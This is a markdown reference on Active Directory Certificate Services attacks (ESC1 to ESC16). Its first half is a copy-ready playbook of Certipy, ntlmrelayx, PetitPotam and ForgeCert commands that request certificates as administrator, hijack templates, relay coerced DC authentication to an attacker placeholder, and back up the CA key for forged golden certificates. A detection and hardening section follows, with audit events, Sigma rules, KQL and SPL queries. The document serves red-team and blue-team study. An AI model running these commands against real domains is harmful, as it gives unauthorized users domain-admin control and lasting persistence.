# AD CS Attacks — ESC1 to ESC16 (Certipy)

Deep reference for Active Directory Certificate Services (AD CS) abuse. Misconfigured certificate templates and CAs let a low-privileged user obtain a certificate that authenticates as a privileged principal (PKINIT → TGT → NT hash) — frequently the single fastest path to Domain/Enterprise Admin. Companion to `ad-enumeration-and-attacks.md` and `kerberos-attacks.md`.

> Tooling: **Certipy v5** (ly4k) covers enumeration and ESC1–ESC16. **Certify**/**ForgeCert** are the Windows/.NET equivalents. NTLM-relay ESCs (ESC8/ESC11) use `ntlmrelayx --adcs` or `certipy relay`.

---

## 1. Why AD CS Matters

A certificate with **Client Authentication** EKU (or SmartCardLogon/PKINIT/Any-Purpose) can be used to authenticate via Kerberos PKINIT. Certipy turns the issued `.pfx` into a TGT and recovers the account's NT hash. So: *control over who/what a cert is issued for = control over that identity.*

```bash
# Authenticate with ANY obtained certificate → TGT + NT hash (the universal final step)
certipy auth -pfx target.pfx -dc-ip <DC_IP>
certipy auth -pfx target.pfx -dc-ip <DC_IP> -ldap-shell      # drop into LDAP shell for follow-on
# If UnPAC-the-hash fails (e.g. AES-only), use the LDAP-shell or get a TGT and PtT.
```

---

## 2. Enumeration

```bash
# Find all vulnerable + enabled templates / CA misconfigs in one scan
certipy find -vulnerable -enabled -u user@domain.local -p 'pass' -dc-ip <DC_IP>
certipy find -u user@domain.local -p 'pass' -dc-ip <DC_IP> -stdout        # full, to terminal
certipy find -u user@domain.local -p 'pass' -dc-ip <DC_IP> -json          # machine-readable
# Output flags each template's ESC class ([!] Vulnerabilities: ESC1, ...).
```
```bash
# Quick triage from NetExec
nxc ldap <DC_IP> -u user -p pass -M adcs
```
```powershell
# Certify (Windows)
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser
```

---

## 3. The ESC Catalog

For each, the universal finish is `certipy auth -pfx <out>.pfx`. Replace `CA_NAME`, `<CA_HOST>`, template names as found.

### ESC1 — Enrollee supplies subject (SAN) + Client Auth, low-priv enroll
The template lets the requester specify an arbitrary SAN/UPN. Request a cert *as* a privileged user.
```bash
certipy req -u user@domain.local -p 'pass' -dc-ip <DC_IP> -target <CA_HOST> \
  -ca CA_NAME -template VulnTemplate -upn administrator@domain.local
# bind by SID too (defeats ESC9/strong-mapping):
certipy req ... -upn administrator@domain.local -sid 'S-1-5-21-...-500'
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

### ESC2 — Any-Purpose EKU (or no EKU)
Template grants Any-Purpose EKU → use the cert for client auth (and more). Often combine with on-behalf-of like ESC3.
```bash
certipy req -u user@domain.local -p 'pass' -dc-ip <DC_IP> -target <CA_HOST> -ca CA_NAME -template AnyPurposeTemplate
```

### ESC3 — Enrollment Agent certificate
Template grants the **Certificate Request Agent** EKU → request a cert *on behalf of* anyone.
```bash
# 1. Get the enrollment-agent cert
certipy req -u user@domain.local -p 'pass' -dc-ip <DC_IP> -target <CA_HOST> -ca CA_NAME -template EnrollmentAgent
# 2. Use it to enroll on behalf of a privileged user
certipy req -u user@domain.local -p 'pass' -dc-ip <DC_IP> -target <CA_HOST> -ca CA_NAME \
  -template User -pfx user.pfx -on-behalf-of 'domain\administrator'
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

### ESC4 — Write access to a template (template hijack)
You have write rights on a template → make it ESC1-vulnerable, exploit, revert.
```bash
certipy template -u user@domain.local -p 'pass' -dc-ip <DC_IP> -template VulnTemplate -write-default-configuration
# then exploit exactly like ESC1:
certipy req -u user@domain.local -p 'pass' -dc-ip <DC_IP> -target <CA_HOST> -ca CA_NAME \
  -template VulnTemplate -upn administrator@domain.local -sid 'S-1-5-21-...-500'
# revert:
certipy template -u user@domain.local -p 'pass' -template VulnTemplate -configuration VulnTemplate.json
```

### ESC5 — Vulnerable PKI object/ACL (CA computer, CA's AD object, etc.)
Write access to an object the PKI trusts (CA server object, OID container, etc.) → escalate. Exploitation depends on the specific object; often reduces to ESC4/ESC7 or compromising the CA host.

### ESC6 — `EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA
CA-wide flag lets ANY template honor a requester-supplied SAN. Treat any enrollable client-auth template as ESC1.
```bash
certipy req -u user@domain.local -p 'pass' -dc-ip <DC_IP> -target <CA_HOST> -ca CA_NAME \
  -template User -upn administrator@domain.local -sid 'S-1-5-21-...-500'
```

### ESC7 — Dangerous CA rights (ManageCA / ManageCertificates)
With **ManageCA** you can add yourself as an officer (ManageCertificates), enable a template, and approve your own pending requests; also flip ESC6 on.
```bash
# Add yourself as officer (ManageCertificates) using ManageCA
certipy ca -u admin@domain.local -p 'pass' -target <CA_HOST> -ca CA_NAME -add-officer 'attacker'
# Enable a client-auth template if needed
certipy ca -u admin@domain.local -p 'pass' -target <CA_HOST> -ca CA_NAME -enable-template 'SubCA'
# Request (will go pending), then approve it as officer, then retrieve:
certipy req -u attacker@domain.local -p 'pass' -ca CA_NAME -template SubCA -upn administrator@domain.local -target <CA_HOST>   # note request id
certipy ca -u attacker@domain.local -p 'pass' -ca CA_NAME -target <CA_HOST> -issue-request <REQ_ID>
certipy req -u attacker@domain.local -p 'pass' -ca CA_NAME -target <CA_HOST> -retrieve <REQ_ID>
```

### ESC8 — NTLM relay to AD CS HTTP enrollment
The CA's web enrollment (`/certsrv`) accepts NTLM and lacks EPA → relay a coerced machine/DC account and get a cert for it.
```bash
# Relay engine
impacket-ntlmrelayx -t http://<CA_HOST>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# or Certipy's own relay
certipy relay -target http://<CA_HOST> -template DomainController
# Coerce a DC to authenticate (PrinterBug/PetitPotam/DFSCoerce → see ntlm-relay-and-coercion.md)
python3 PetitPotam.py -u user -p pass <ATTACKER_IP> <DC_IP>
# Use the relayed DC$ cert:
certipy auth -pfx dc01.pfx -dc-ip <DC_IP>            # DC$ TGT → DCSync
```

### ESC9 — No security extension (missing SID) + weak mapping
Template has `CT_FLAG_NO_SECURITY_EXTENSION`; with weak/UPN-based mapping you can request a cert whose UPN points at a victim (after changing your own UPN if you control it). Persists across password changes.
```bash
certipy req -u user@domain.local -p 'pass' -dc-ip <DC_IP> -target <CA_HOST> -ca CA_NAME -template ESC9
certipy auth -pfx esc9.pfx -dc-ip <DC_IP> -ldap-shell
```

### ESC10 — Weak certificate mapping on the DC
Registry-level weak mapping (`StrongCertificateBindingEnforcement`/`CertificateMappingMethods`). Similar UPN/SAN-mapping abuse to ESC9, exploited via account UPN manipulation + cert request.

### ESC11 — NTLM relay to CA RPC (ICertPassage / no `IF_ENFORCEENCRYPTICERTREQUEST`)
The CA RPC interface accepts unencrypted NTLM → relay over RPC.
```bash
impacket-ntlmrelayx -t rpc://<CA_HOST> -rpc-mode ICPR -icpr-ca-name CA_NAME --adcs --template Machine
# (Certipy: certipy relay -target rpc://<CA_HOST> ...)
```

### ESC13 — Issuance policy linked to an AD group (`msDS-OIDToGroupLink`)
Enrolling in a template whose issuance policy OID is linked to a privileged group grants that group membership in the resulting token.
```bash
certipy req -u user@domain.local -p 'pass' -dc-ip <DC_IP> -target <CA_HOST> -ca CA_NAME -template ESC13Template
certipy auth -pfx esc13.pfx -dc-ip <DC_IP> -ldap-shell
```

### ESC14 — Weak explicit mapping via `altSecurityIdentities`
Write access to a target's `altSecurityIdentities` lets you map your cert to their identity (or a weak existing mapping). Exploited by setting the mapping then authenticating with your cert as the victim.

### ESC15 / CVE-2024-49019 — Application Policies on V1 templates ("EKUwu")
Unpatched CAs let you inject arbitrary **application policies** into a V1-schema template, e.g. adding Certificate-Request-Agent or Client-Auth even when the template's EKU forbids it.
```bash
certipy req -u user@domain.local -p 'pass' -dc-ip <DC_IP> -target <CA_HOST> -ca CA_NAME \
  -template WebServer -application-policies '1.3.6.1.4.1.311.20.2.1'    # Certificate Request Agent
# then on-behalf-of like ESC3:
certipy req -u user@domain.local -pfx user.pfx -ca CA_NAME -template User -on-behalf-of 'domain\administrator' -target <CA_HOST>
# Or inject Client Auth and use directly:
certipy req ... -application-policies '1.3.6.1.5.5.7.3.2' -upn administrator@domain.local
```

### ESC16 — CA-wide disabled SID security extension
The CA globally omits `szOID_NTDS_CA_SECURITY_EXT` (the ESC9 condition applied CA-wide). Every issued cert bypasses SID validation → request as a privileged UPN.
```bash
certipy req -u user@domain.local -p 'pass' -dc-ip <DC_IP> -target <CA_HOST> -ca CA_NAME \
  -template User -upn administrator@domain.local
certipy auth -pfx administrator.pfx -dc-ip <DC_IP> -ldap-shell
```

---

## 4. Persistence via Certificates

- A stolen/forged user or machine certificate authenticates for its **validity period** regardless of password resets — durable persistence (DPERSIST).
- **Golden Certificate**: steal the CA's private key (`certipy ca -backup`, or via ESC7/host compromise) → forge arbitrary client-auth certs offline with **ForgeCert**.
```bash
certipy ca -u admin@domain.local -p 'pass' -target <CA_HOST> -ca CA_NAME -backup     # exfil CA key
# ForgeCert.exe --CaCertPath ca.pfx --Subject ... --SubjectAltName administrator@domain.local --NewCertPath fake.pfx
```

---

## 5. Cheatsheet

```bash
# ENUM
certipy find -vulnerable -enabled -u u@dom -p p -dc-ip <DC>

# ESC1 / ESC6 / ESC16 (SAN injection)
certipy req -u u@dom -p p -dc-ip <DC> -target <CA> -ca CA -template T -upn administrator@dom -sid S-1-5-...-500
certipy auth -pfx administrator.pfx -dc-ip <DC>

# ESC3 (enroll agent)
certipy req -u u@dom -p p -target <CA> -ca CA -template EnrollmentAgent
certipy req -u u@dom -pfx u.pfx -target <CA> -ca CA -template User -on-behalf-of 'dom\administrator'

# ESC7 (ManageCA)
certipy ca -u u@dom -p p -target <CA> -ca CA -add-officer attacker

# ESC8 (relay)
impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
PetitPotam.py -u u -p p <ATTACKER> <DC>

# ESC15 (EKUwu / CVE-2024-49019)
certipy req -u u@dom -p p -target <CA> -ca CA -template WebServer -application-policies '1.3.6.1.4.1.311.20.2.1'

# Golden cert
certipy ca -u admin@dom -p p -target <CA> -ca CA -backup
```

| ESC | One-liner essence |
|-----|-------------------|
| ESC1/6/16 | request cert with attacker-chosen SAN/UPN |
| ESC2 | any-purpose EKU → enroll-on-behalf |
| ESC3 | get enrollment-agent cert → on-behalf-of |
| ESC4 | write template → make it ESC1 |
| ESC7 | ManageCA → add officer / enable template / approve |
| ESC8/11 | relay coerced auth → HTTP(8)/RPC(11) enrollment |
| ESC9/10/14 | weak mapping (missing SID / altSecurityIdentities) |
| ESC13 | issuance-policy OID linked to privileged group |
| ESC15 | inject application policies into V1 template (CVE-2024-49019) |

---

## Detection & Mitigation

Defensive guidance for AD CS abuse ESC1–ESC16, the universal PKINIT finish (`certipy auth`), Golden Certificate persistence, and the NTLM-relay ESCs (ESC8 HTTP, ESC11 RPC). The two richest signal sources are **CA issuance auditing on the CA host** and **DC PKINIT logon events**; cross-reference `ntlm-relay-and-coercion.md` for ESC8/ESC11 coercion detection.

### Telemetry & Log Sources

- **CA host (Certification Authority role) security log** — enable **"Audit Certification Services"** (Object Access subcategory) and CA-level auditing (`certutil -setreg CA\AuditFilter 127`, then restart certsvc):
  - `4886` — Certificate Services received a certificate request.
  - `4887` — Certificate Services approved and issued a certificate (carries Requester, **SAN/Subject**, template, request ID — the core ESC1/6/16 signal).
  - `4888` — request denied; `4889` — request set to pending; `4885`/`4890`/`4891`/`4892` — CA service/role/config changes (ESC7, ESC6 `EDITF` flips, template enable).
- **CaPolicy / CertSvc operational logs** and the CA database (`certutil -view`) for issued-cert SAN review and forensic reconstruction.
- **Domain Controllers — PKINIT / certificate logon**:
  - `4768` Kerberos TGT request where **Certificate Information** fields are populated (PKINIT) — ties an issued cert to a TGT and reveals the authenticating identity.
  - `4624`/`4768` for certificate-based logon by accounts that normally use passwords (Shadow-cred / cert persistence).
  - DC System log **Event 39/41** (Kdcsvc) — certificate **without a strong SID mapping** (the ESC9/ESC10/ESC14/ESC16 weak-mapping condition) once `StrongCertificateBindingEnforcement` is in audit/enforce mode.
- **Directory object auditing (SACL, 4662 / 5136)** on the **PKI configuration containers** (`CN=Public Key Services,CN=Services,CN=Configuration,…`): writes to certificate templates (ESC4), `msPKI-Certificate-Name-Flag` / `pKIExtendedKeyUsage`, `msDS-OIDToGroupLink` (ESC13), and `altSecurityIdentities` on user/computer objects (ESC14).
- **CA web enrollment (ESC8)** — IIS logs for `/certsrv/certfnsh.asp`, plus `4624` Logon Type 3 NTLM logons to the CA from machine accounts; EPA-disabled `/certsrv` is the exposure.
- **NTLM-relay precursors (ESC8/ESC11)** — coercion auth patterns (PetitPotam/PrinterBug/DFSCoerce) inbound to attacker → outbound to CA; see the relay file for `4624`/`5145` patterns.
- **EDR / network** — outbound RPC `ICertPassage` (ICPR) to the CA from unexpected hosts (ESC11); CA private-key export / backup operations (Golden Certificate, ESC7 `-backup`).

### Detection Logic

Key behavioral patterns:

- **ESC1 / ESC6 / ESC16 (SAN injection)** — `4887` where the issued certificate's **SAN/UPN does not match the requesting account** (e.g. requester `lowuser` but SAN `administrator@domain`), or a requester whose Subject differs from their own identity. ESC6/ESC16 make this possible CA-wide, so any template can be the vehicle.
- **ESC2 / ESC3 / ESC15 (enrollment-agent / on-behalf-of)** — `4886`/`4887` for certs bearing the **Certificate Request Agent** EKU (`1.3.6.1.4.1.311.20.2.1`) or Any-Purpose EKU, especially newly issued to non-PKI-admin users; ESC15 injects application policies into a V1 template (CVE-2024-49019) — watch for unexpected application-policy OIDs in V1 requests.
- **ESC4 (template hijack)** — `5136`/`4662` modification of a certificate-template object (changes to `msPKI-Certificate-Name-Flag` enabling ENROLLEE_SUPPLIES_SUBJECT, or EKU additions) by a non-admin, typically followed minutes later by an ESC1-style issuance.
- **ESC6 / ESC16 (CA config flip)** — CA config change events / `certutil` showing `EDITF_ATTRIBUTESUBJECTALTNAME2` set, or `DisableExtensionList` containing the SID OID (`1.3.6.1.4.1.311.25.2`).
- **ESC7 (Manage CA / Manage Certificates)** — officer added, template enabled, or a previously **pending** request manually issued (`4889`→`4887` by an unexpected officer).
- **ESC8 / ESC11 (relay)** — machine/DC account (`$`) authenticating to the CA web enrollment or RPC interface from a host that is not that machine, immediately yielding a cert; correlate with coercion events on the DC.
- **ESC9 / ESC10 / ESC14 (weak mapping)** — Kdcsvc Event 39/41 on DCs (no strong SID mapping), or `5136` writes to `altSecurityIdentities` (ESC14) by non-admins.
- **ESC13 (issuance-policy → group)** — `5136` write to `msDS-OIDToGroupLink` linking an issuance-policy OID to a privileged group; enrollment in such a template granting unexpected token membership.
- **Golden Certificate / persistence** — CA private-key backup/export, or cert-based logons whose serial/issuance has **no corresponding `4886`/`4887` on the CA** (forged offline with the stolen CA key).

```yaml
title: AD CS ESC1/ESC6/ESC16 - Certificate Issued with Mismatched SAN
id: e5c1-san-mismatch-4887
status: experimental
description: Certificate issued where the SubjectAltName/UPN does not match the requesting account, indicating enrollee-supplied-subject abuse (ESC1) or CA-wide SAN abuse (ESC6/ESC16).
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4887                    # Certificate Services approved and issued a certificate
  flag_priv_san:
    SubjectAltName|contains:
      - 'administrator@'
      - 'domain admins'
      - '-500'                       # well-known RID for built-in Administrator (SID-bound SAN)
  condition: selection and flag_priv_san
fields:
  - Requester
  - SubjectAltName
  - CertificateTemplate
  - RequestId
falsepositives:
  - Legitimate admin self-enrollment (baseline requester==SAN owner and allowlist)
level: high
tags:
  - attack.privilege_escalation
  - attack.t1649
```

```yaml
title: AD CS ESC3/ESC15 - Enrollment Agent / Certificate Request Agent EKU Issued
id: e5c3-enrollagent-eku-4887
status: experimental
description: Detects issuance of a certificate carrying the Certificate Request Agent EKU to a non-PKI-admin account, used for on-behalf-of enrollment (ESC3) or EKUwu/application-policy injection (ESC15).
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID:
      - 4886
      - 4887
    EnhancedKeyUsage|contains: '1.3.6.1.4.1.311.20.2.1'   # Certificate Request Agent
  condition: selection
fields:
  - Requester
  - CertificateTemplate
  - RequestId
falsepositives:
  - Designated enrollment-agent operators (allowlist their accounts)
level: high
tags:
  - attack.privilege_escalation
  - attack.t1649
```

```yaml
title: AD CS ESC4 - Certificate Template Modified
id: e5c4-template-write-5136
status: experimental
description: Detects modification of a certificate-template AD object (e.g. enabling enrollee-supplied subject or adding a client-auth EKU), the precursor to ESC1-style abuse.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    ObjectClass: 'pKICertificateTemplate'
  attrs:
    AttributeLDAPDisplayName:
      - 'msPKI-Certificate-Name-Flag'
      - 'pKIExtendedKeyUsage'
      - 'msPKI-Enrollment-Flag'
      - 'msPKI-Certificate-Application-Policy'
  filter_pki_admins:
    SubjectUserName|in: '%PkiAdmins%'
  condition: selection and attrs and not filter_pki_admins
fields:
  - SubjectUserName
  - ObjectDN
  - AttributeLDAPDisplayName
  - AttributeValue
falsepositives:
  - Authorized PKI administrators performing template maintenance
level: high
tags:
  - attack.privilege_escalation
  - attack.t1649
  - attack.t1098
```

KQL (Sentinel / Defender) — ESC8/ESC11 relay: machine account enrolling from a foreign host:

```kql
SecurityEvent
| where EventID == 4887                       // certificate issued
| where Requester endswith "$"                // machine/DC account
| extend ReqHost = tostring(split(Requester, "$")[0])
| where Computer !contains ReqHost            // issued for a machine that isn't the one enrolling
| project TimeGenerated, Computer, Requester, SubjectAltName, CertificateTemplate, RequestId
| order by TimeGenerated desc
```

Splunk SPL — ESC13 issuance-policy link to a privileged group:

```spl
index=wineventlog EventCode=5136 Attribute_LDAP_Display_Name="msDS-OIDToGroupLink"
| stats values(Object_DN) as policy_oid values(Attribute_Value) as linked_group by Account_Name, _time
| where isnotnull(linked_group)
```

### Hardening & Mitigations

- **Enforce strong certificate mapping** — deploy KB5014754 and set `StrongCertificateBindingEnforcement = 2` (Full Enforcement) on DCs so certs must carry the **SID security extension** (`szOID_NTDS_CA_SECURITY_EXT`); set `CertificateMappingMethods` to drop weak (UPN/issuer-subject) mappings. Defeats ESC9/ESC10/ESC14/ESC16 (T1649).
- **Remove `EDITF_ATTRIBUTESUBJECTALTNAME2`** from every CA (`certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2`, restart certsvc) and never re-enable it. Kills ESC6 (and the CA-wide SAN path).
- **Harden templates (ESC1/ESC2/ESC4)** — clear `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` on client-auth templates; require **Manager Approval** (`CT_FLAG_PEND_ALL_REQUESTS`) and/or authorized signatures for sensitive templates; remove Any-Purpose / no-EKU and over-broad EKUs; scope **Enroll/AutoEnroll** ACLs to least privilege and remove write access for non-PKI-admins. Audit with `certipy find -vulnerable` (blue-team self-assessment).
- **Restrict CA roles (ESC7)** — limit **ManageCA** and **ManageCertificates** to a tiny, audited admin set; alert on officer additions and template enable.
- **Lock down enrollment-agent templates (ESC3)** — restrict who can enroll for the Certificate Request Agent EKU and constrain agents to specific templates/subjects via Enrollment Agent Restrictions.
- **Patch ESC15 / CVE-2024-49019 (EKUwu)** — apply the November 2024 updates; remediate/retire V1-schema templates that allow application-policy injection.
- **Kill the relay ESCs (ESC8/ESC11)** — enable **Extended Protection for Authentication (EPA)** on the CA web enrollment (`/certsrv`), set the IIS site to require SSL/HTTPS, and enable `IF_ENFORCEENCRYPTICERTREQUEST` so the RPC (ICPR) interface requires packet privacy/encryption (ESC11). Disable NTLM to the CA and prefer Kerberos; ideally remove web enrollment if unused. Pair with coercion mitigations (RPC filters, see `ntlm-relay-and-coercion.md`). Maps to D3FEND Message Authentication / Inbound Traffic Filtering.
- **Constrain issuance-policy links (ESC13)** — audit and minimize `msDS-OIDToGroupLink`; never link an issuance policy to a privileged group.
- **Protect the CA private key (Golden Certificate / DPERSIST)** — store the CA key in an HSM (non-exportable), restrict and audit `certipy ca -backup` / key-export operations, and on suspected compromise be prepared to revoke and rebuild the PKI hierarchy. Monitor for issued-cert logons with no matching `4886`/`4887`.
- **Tighten certificate lifetimes & enable revocation** — shorter validity reduces the persistence window for stolen/forged certs; maintain working CRL/OCSP and revoke on incident.

### MITRE ATT&CK Mapping

| Technique | ID | Detection / Mitigation note |
|-----------|----|------------------------------|
| Steal or Forge Authentication Certificates | T1649 | 4887 SAN-mismatch issuance; strong cert binding; template hardening; HSM-protected CA key |
| Account Manipulation (ESC4 template / ESC13 / ESC14 writes) | T1098 | SACL audit on PKI containers and altSecurityIdentities/OIDToGroupLink; least-priv ACLs |
| Valid Accounts: Domain Accounts (PKINIT logon as priv principal) | T1078.002 | DC PKINIT 4768 with cert info; cert logon by password-only accounts |
| Adversary-in-the-Middle: LLMNR/NBT-NS / relay to AD CS (ESC8/ESC11) | T1557.001 | Machine account enrolling from a foreign host; EPA on /certsrv; IF_ENFORCEENCRYPTICERTREQUEST |
| Forced Authentication / coercion driving relay ESCs | T1187 | RPC filters; correlate coercion auth with CA enrollment; see ntlm-relay-and-coercion.md |

---

## References

- Certipy wiki — https://github.com/ly4k/Certipy/wiki
- SpecterOps – Certified Pre-Owned (original ESC1-8 paper) — https://posts.specterops.io/certified-pre-owned-d95910965cd2
- xbz0n – Breaking ADCS: ESC1 to ESC16 — https://xbz0n.sh/blog/adcs-complete-attack-reference
- The Hacker Recipes – AD CS — https://www.thehacker.recipes/ad/movement/adcs/
- HackTricks – AD CS Domain Escalation — https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html
- TrustedSec – EKUwu (ESC15 / CVE-2024-49019) — https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc
- Certify / ForgeCert (GhostPack) — https://github.com/GhostPack/Certify , https://github.com/GhostPack/ForgeCert
